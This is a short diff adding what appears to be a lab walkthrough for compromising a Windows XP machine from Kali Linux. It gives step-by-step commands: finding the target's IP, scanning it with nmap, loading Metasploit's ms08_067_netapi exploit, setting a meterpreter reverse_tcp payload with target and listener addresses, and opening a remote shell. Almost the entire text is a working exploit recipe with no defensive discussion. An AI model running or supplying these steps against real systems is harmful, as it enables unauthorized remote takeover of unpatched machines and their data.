@@ -1,0 +1,20 @@
+===================: In XP: ======================
+Step 1: Win+R
+Step 2: type "cmd"
+step 3: ipconfig
+[Remember the ip-address as a RHOST]
+
+=======================: In Kali Linux: =========================
+root@HackCieux:~# ifconfig
+root@HackCieux:~# msfconsole
+root@HackCieux:~# nmap -T4 -A -v 192.168.0.107      //<ip of Xp machine>
+root@HackCieux:~# use exploit/windows/smb/ms08_067_netapi
+root@HackCieux:~# set PAYLOAD windows/meterpreter/reverse_tcp
+root@HackCieux:~# show targets
+root@HackCieux:~# set TARGET 4
+root@HackCieux:~# set RHOST 192.168.0.107
+root@HackCieux:~# set LHOST 192.168.0.106
+root@HackCieux:~# set LPORT 8080
+root@HackCieux:~# exploit
+meterpreter> help
+meterpreter> shell
